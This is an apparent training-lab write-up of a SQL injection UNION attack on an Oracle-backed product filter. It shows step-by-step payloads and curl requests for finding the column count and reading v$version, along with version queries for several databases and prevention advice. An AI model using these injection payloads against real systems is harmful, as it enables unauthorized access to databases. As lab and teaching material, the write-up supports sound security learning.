# SQL Injection UNION Attack - Database Version

## Lab Description
This lab contains a SQL injection vulnerability in the product category filter. The goal is to use a UNION attack to retrieve the database version string.

**Difficulty**: Practitioner  
**Lab URL**: https://0a2f00f50416f19980af08a000d1003f.web-security-academy.net/

## Vulnerability Analysis

### Original Query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### UNION Attack Basics
A UNION attack allows us to append results from an injected query to the original query results. Requirements:
1. Both queries must return the same number of columns
2. Data types in corresponding columns must be compatible

## Exploitation

### Step 1: Determine Database Type

First, we need to identify the database system. We can test with database-specific syntax:

**Oracle Test**:
```sql
' UNION SELECT NULL FROM DUAL--
```

**Request**:
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+NULL+FROM+DUAL--"
```

**Response**: Internal Server Error (wrong number of columns)

### Step 2: Determine Number of Columns

We increment NULL values until we get a valid response:

**Test with 2 columns**:
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+DUAL--"
```

**Response** (truncated):
```html
<tr>
    <th>Conversation Controlling Lemon</th>
    <td>Are you one of those people who opens their mouth...</td>
</tr>
<tr>
    <th>Couple's Umbrella</th>
    <td>Do you love public displays of affection?...</td>
</tr>
```

✅ Success! The query returns 2 columns.

### Step 3: Retrieve Database Version

For Oracle databases, version information is stored in `v$version` table with the `banner` column.

**Payload**: `Gifts' UNION SELECT banner,NULL FROM v$version--`

**Request**:
```bash
curl "https://[lab-url]/filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v\$version--"
```

**Response** (truncated):
```html
<tr>
    <th>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</th>
</tr>
<tr>
    <th>PL/SQL Release 11.2.0.2.0 - Production</th>
</tr>
<tr>
    <th>CORE	11.2.0.2.0	Production</th>
</tr>
<tr>
    <th>TNS for Linux: Version 11.2.0.2.0 - Production</th>
</tr>
<tr>
    <th>NLSRTL Version 11.2.0.2.0 - Production</th>
</tr>
```

### Step 4: Execute via Browser

1. Navigate to: `https://[lab-url]/filter?category=Gifts`
2. Modify URL to: `/filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--`
3. The database version strings appear in the product listings
4. Lab automatically marks as solved

## Key Concepts

### UNION Requirements
- **Same column count**: Use NULL to match columns
- **Compatible data types**: NULL works for any type
- **Column order matters**: Position in SELECT determines position in results

### Database-Specific Version Queries

| Database | Query |
|----------|-------|
| Oracle | `SELECT banner FROM v$version` |
| MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Microsoft SQL Server | `SELECT @@version` |

### Oracle-Specific Notes
- Must use `FROM DUAL` for queries without a table
- `v$version` contains multiple rows with version info
- Use `$` in URL as `\$` to escape shell interpretation

## Alternative Approaches

**Get single version string** (Oracle 12c+):
```sql
' UNION SELECT version, NULL FROM v$instance--
```

**Test column data types**:
```sql
' UNION SELECT 'a', NULL FROM DUAL--
' UNION SELECT NULL, 'a' FROM DUAL--
```

## Prevention

- **Use Parameterized Queries**:
  ```java
  // Bad
  String query = "SELECT * FROM products WHERE category = '" + category + "'";
  
  // Good
  PreparedStatement stmt = conn.prepareStatement("SELECT * FROM products WHERE category = ?");
  stmt.setString(1, category);
  ```
- **Input Validation**: Whitelist allowed categories
- **Least Privilege**: Database user shouldn't access system tables
- **Error Handling**: Don't expose database errors to users

## Lab Completion
Once the database version is displayed on the page, the lab is automatically solved.
